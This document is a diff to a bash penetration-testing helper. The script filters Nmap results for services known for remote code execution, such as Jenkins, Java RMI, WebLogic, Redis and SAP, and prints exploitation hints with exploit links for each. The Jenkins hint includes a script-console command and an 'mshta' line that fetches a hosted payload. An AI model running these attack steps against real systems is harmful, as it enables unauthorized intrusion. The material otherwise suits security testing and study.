@@ -53,18 +53,18 @@ function processing (){
     echo 'Processing data...'
 }
 
-function rce_parser (){
-    cat $input | grep -i 'Nmap scan report for \|^1090/tcp\|^1098/tcp\|^1099/tcp\|^4444/tcp\|^11099/tcp\|^47001/tcp\|^47002/tcp\|^10999/tcp\|^12721/tcp\|^7000/tcp\|^7001/tcp\|^7002/tcp\|^7003/tcp\|^7004/tcp\|^8000/tcp\|^8001/tcp\|^8002/tcp\|^8003/tcp\|^9000/tcp\|^9001/tcp\|^9002/tcp\|^9003/tcp\|^9503/tcp\|^7070/tcp\|^7071/tcp\|^45000/tcp\|^45001/tcp\|^8686/tcp\|^9012/tcp\|^50500/tcp\|^4848/tcp\|^11111/tcp\|^4444/tcp\|^4445/tcp\|^4786/tcp\|^5555/tcp\|^5556/tcp\|^8880/tcp\|^8088/tcp\|^6379/tcp\|^2375/tcp\|^8983/tcp\|^8383/tcp\|^4990/tcp\|^8500/tcp\|^6066/tcp\|^5000/tcp\|^3300/tcp\|^6129/tcp\|^6970/tcp\|weblogic\|jdwp\|jmx\|glassfish\|jboss\|redis\|sap\|dameware\|coldfusion\|jenkins\|docker\|flink\|spark\|hadoop\|zoho\|manageengine\|hashicorp\|consul\|websphere\|solr\|portainer\|java-rmi\|java rmi\|rmi-registry\|hp data protector\|cisco smart install\|cisco unified communications manager\|tomcat\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' > $output
-}
+#function rce_parser (){
+#    cat $input | grep -i 'Nmap scan report for \|^1090/tcp\|^1098/tcp\|^1099/tcp\|^4444/tcp\|^11099/tcp\|^47001/tcp\|^47002/tcp\|^10999/tcp\|^12721/tcp\|^7000/tcp\|^7001/tcp\|^7002/tcp\|^7003/tcp\|^7004/tcp\|^8000/tcp\|^8001/tcp\|^8002/tcp\|^8003/tcp\|^9000/tcp\|^9001/tcp\|^9002/tcp\|^9003/tcp\|^9503/tcp\|^7070/tcp\|^7071/tcp\|^45000/tcp\|^45001/tcp\|^8686/tcp\|^9012/tcp\|^50500/tcp\|^4848/tcp\|^11111/tcp\|^4444/tcp\|^4445/tcp\|^4786/tcp\|^5555/tcp\|^5556/tcp\|^8880/tcp\|^8088/tcp\|^6379/tcp\|^2375/tcp\|^8983/tcp\|^8383/tcp\|^4990/tcp\|^8500/tcp\|^6066/tcp\|^5000/tcp\|^3300/tcp\|^6129/tcp\|^6970/tcp\|weblogic\|jdwp\|jmx\|glassfish\|jboss\|redis\|sap\|dameware\|coldfusion\|jenkins\|docker\|flink\|spark\|hadoop\|zoho\|manageengine\|hashicorp\|consul\|websphere\|solr\|portainer\|java-rmi\|java rmi\|rmi-registry\|hp data protector\|cisco smart install\|cisco unified communications manager\|tomcat\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' > $output
+#}
 
 function jenkins (){
 echo '
-----------
+**************************************************
 - Jenkins: 8080
 
     If no auth required, script engine php execution:
     def cmd = "cmd.exe /c whoami".execute();
-    println("${cmd.text}");    
+    println("${cmd.text}");
     #Replace whoami with hosted payload. mshta http://file.hta
 
     If auth required and outdated:
@@ -77,10 +77,10 @@ echo '
 
 function javarmi (){
 echo '
----------
+**************************************************
 - Java RMI: 1090,1098,1099,4444,11099,47001,47002,10999
 - Java RMI vcenter: 12721
-    Check nmap results for "rmi-registry,java-rmi".
+
     nmap -v -Pn --open -sV -p 1099 --script rmi-vulnclassloader,rmi-dumpregistry
 
     [https://github.com/frohoff/ysoserial]
@@ -97,7 +97,7 @@ echo '
 
 function weblogic (){
 echo '
----------
+**************************************************
 - WebLogic: 7000-7004,8000-8003,9000-9003,9503,7070,7071
 
     [https://www.exploit-db.com/search?q=weblogic]
@@ -108,7 +108,7 @@ echo '
 
 function jdwp (){
 echo '
----------
+**************************************************
 - JDWP: 45000,45001
 
     [https://www.rapid7.com/db/modules/exploit/multi/misc/java_jdwp_debugger]
@@ -121,7 +121,7 @@ echo '
 
 function jmx (){
 echo '
----------
+**************************************************
 - JMX: 8686,9012,50500
 
     [https://www.rapid7.com/db/modules/exploit/multi/misc/java_jmx_server]
@@ -132,7 +132,7 @@ echo '
 
 function glassfish (){
 echo '
----------
+**************************************************
 - GlassFish: 4848
 
     [https://www.rapid7.com/db/modules/auxiliary/scanner/http/glassfish_traversal]
@@ -143,7 +143,7 @@ echo '
 
 function jboss (){
 echo '
----------
+**************************************************
 - jBoss: 11111,4444,4445
 
     [https://www.rapid7.com/db/modules/auxiliary/scanner/http/jboss_vulnscan]
@@ -156,7 +156,7 @@ echo '
 
 function ciscosmartinstall (){
 echo '
----------
+**************************************************
 - Cisco Smart Install: 4786
 
     [https://www.rapid7.com/db/modules/auxiliary/scanner/misc/cisco_smart_install]
@@ -169,7 +169,7 @@ echo '
 
 function hpdataprotector (){
 echo '
----------
+**************************************************
 - HP Data Protector: 5555,5556
 
     [https://www.rapid7.com/db/modules/exploit/multi/misc/hp_data_protector_exec_integutil]
@@ -182,7 +182,7 @@ echo '
 
 function redis (){
 echo '
----------
+**************************************************
 - Redis: 6379
 
     [https://www.rapid7.com/db/modules/exploit/linux/redis/redis_replication_cmd_exec/]
@@ -193,7 +193,7 @@ echo '
 
 function sap (){
 echo '
----------
+**************************************************
 - SAP: 3300
 
     [https://github.com/chipik/SAP_GW_RCE_exploit]
@@ -204,7 +204,7 @@ echo '
 
 function dameware (){
 echo '
----------
+**************************************************
 - Dameware: 6129
 
     [https://www.tenable.com/security/research/tra-2019-43]
@@ -217,7 +217,7 @@ echo '
 
 function cucm (){
 echo '
----------
+**************************************************
 - Cisco Unified Communications Manager: 6970
 
     http://[CUCM IP Address]:6970/ConfigFileCacheList.txt
@@ -228,7 +228,7 @@ echo '
 
 function coldfusion (){
 echo '
----------
+**************************************************
 - Adobe Coldfusion Blaze DS: 8080
 
     [https://www.tenable.com/plugins/nessus/99731]
@@ -239,7 +239,7 @@ echo '
 
 function docker (){
 echo '
----------
+**************************************************
 - Docker: 2375
 
 
@@ -249,7 +249,7 @@ echo '
 
 function atlassian (){
 echo '
----------
+**************************************************
 - Atlassian Crowd: 4990
 
 
@@ -259,7 +259,7 @@ echo '
 
 function flink (){
 echo '
----------
+**************************************************
 - Apache flink: 5000
 
 
@@ -269,7 +269,7 @@ echo '
 
 function spark (){
 echo '
----------
+**************************************************
 - Apache Spark: 6066
 
 
@@ -279,7 +279,7 @@ echo '
 
 function hadoop (){
 echo '
----------
+**************************************************
 - Apache Hadoop: 8088
 
 
@@ -289,7 +289,7 @@ echo '
 
 function manageengine (){
 echo '
----------
+**************************************************
 - Zoho Manageengine Desktop: 8383
 
 
@@ -299,7 +299,7 @@ echo '
 
 function hashicorp (){
 echo '
----------
+**************************************************
 - Hashicorp Consul: 8500
 
 
@@ -309,7 +309,7 @@ echo '
 
 function websphere (){
 echo '
----------
+**************************************************
 - IBM WebSphere: 8880
 
 
@@ -319,7 +319,7 @@ echo '
 
 function solr (){
 echo '
----------
+**************************************************
 - Apache Solr: 8983
 
 
@@ -329,7 +329,7 @@ echo '
 
 function portainer (){
 echo '
----------
+**************************************************
 - Portainer: 9000
 
 
@@ -348,7 +348,7 @@ if [ "$#" -ne 2 ]; then
 else
     ascii_art
     processing
-    rce_parser
+#    rce_parser
     jenkins
     javarmi
     weblogic
